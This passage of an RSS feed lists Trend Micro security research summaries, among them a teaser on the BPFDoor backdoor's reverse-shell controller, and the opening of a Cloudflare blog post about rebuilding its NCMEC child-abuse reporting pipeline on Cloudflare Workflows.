isPermaLink="false">urn:uuid:b9fcbbdb-39d3-9cad-5e2a-b27c04786f95</guid><category>Trend Micro Research : Cyber Risk</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Research</category></item><item><title>Strengthen Security with Cyber Risk Advisory</title><link>https://www.trendmicro.com/en_us/research/25/d/cyber-risk-advisory.html</link><description>In today’s fast-paced digital world, cyber threats are constantly evolving. Attackers are leveraging advanced techniques and artificial intelligence (AI) to exploit vulnerabilities, leaving organizations vulnerable to breaches and disruptions. To combat these challenges, organizations must stay vigilant and implement more proactive cybersecurity measures. This is where our Cyber Risk Advisory service, powered by the Trend Vision One™ Cyber Risk Exposure Management (CREM) solution, step in to provide a strategic edge.</description><guid isPermaLink="false">urn:uuid:690d8095-8768-1c08-ee5c-3f4b35649b5b</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Network</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Data center</category></item><item><title>Top 10 for LLM &amp; Gen AI Project Ranked by OWASP</title><link>https://www.trendmicro.com/en_us/research/25/d/top-llm-gen-ai.html</link><description>Trend Micro has become a Gold sponsor of the OWASP Top 10 for LLM and Gen AI Project, merging cybersecurity expertise with OWASP's collaborative efforts to address emerging AI security risks. This partnership underscores Trend Micro's unwavering commitment to advancing AI security, ensuring a secure foundation for the transformative power of AI.</description><guid isPermaLink="false">urn:uuid:94875dc5-8bf7-814c-44bb-6c3a40d98fdd</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>BPFDoor’s Hidden Controller Used Against Asia, Middle East Targets</title><link>https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html</link><description>A controller linked to BPF backdoor can open a reverse shell, enabling deeper infiltration into compromised networks. Recent attacks have been observed targeting the telecommunications, finance, and retail sectors across South Korea, Hong Kong, Myanmar, Malaysia, and Egypt.</description><guid isPermaLink="false">urn:uuid:93d61ced-9166-ec9a-329c-5cff00970092</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>How we simplified NCMEC reporting with Cloudflare Workflows</title><link>https://blog.cloudflare.com/simplifying-ncmec-reporting-with-cloudflare-workflows/</link><description>We transitioned to Cloudflare Workflows to manage complex, multi-step processes more efficiently. This shift replaced our National Center for Missing &amp; Exploited Children (NCMEC) reporting system.</description><content:encoded>&lt;p&gt;Cloudflare plays a significant role in supporting the Internet’s infrastructure. &lt;a href="https://w3techs.com/technologies/history_overview/proxy/all/q"&gt;&lt;u&gt;As a reverse proxy by approximately 20% of all websites&lt;/u&gt;&lt;/a&gt;, we sit directly in the request path between users and the origin, helping to improve performance, security, and reliability at scale. Beyond that, our global network powers services like &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/cdn/"&gt;&lt;u&gt;delivery&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://workers.cloudflare.com/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.cloudflare.com/en-gb/developer-platform/products/r2/"&gt;&lt;u&gt;R2&lt;/u&gt;&lt;/a&gt; — making Cloudflare not just a passive intermediary, but an active platform for delivering and hosting content across the Internet.&lt;/p&gt;&lt;p&gt;Since Cloudflare’s launch in 2010, we have collaborated with the National Center for Missing and Exploited Children (&lt;a href="https://www.missingkids.org/home"&gt;&lt;u&gt;NCMEC&lt;/u&gt;&lt;/a&gt;), a US-based clearinghouse for reporting child sexual abuse material (CSAM), and are committed to doing what we can to support identification and removal of CSAM content.&lt;/p&gt;&lt;p&gt;Members of the public, &lt;a href="https://blog.cloudflare.com/cloudflares-response-to-csam-online/"&gt;&lt;u&gt;customers, and trusted organizations can submit reports&lt;/u&gt;&lt;/a&gt; of abuse observed on Cloudflare’s network. A minority of these reports relate to CSAM, which are triaged with the highest priority by Cloudflare’s Trust &amp;amp; Safety team. We will also forward details of the report, along with relevant files (where applicable) and supplemental information to NCMEC.&lt;/p&gt;&lt;p&gt;The process to generate and submit reports to NCMEC involves multiple steps, dependencies, and error handling, which quickly became complex under our original queue-based architecture. In this blog post, we discuss how Cloudflare &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Workflows&lt;/u&gt;&lt;/a&gt; helped streamline this process and simplify the code behind it.&lt;/p&gt;
           &lt;div&gt;
             &lt;h2&gt;Life before Cloudflare Workflows&lt;/h2&gt;
             &lt;a href="https://blog.cloudflare.com/tag/security/rss#life-before-cloudflare-workflows"&gt;
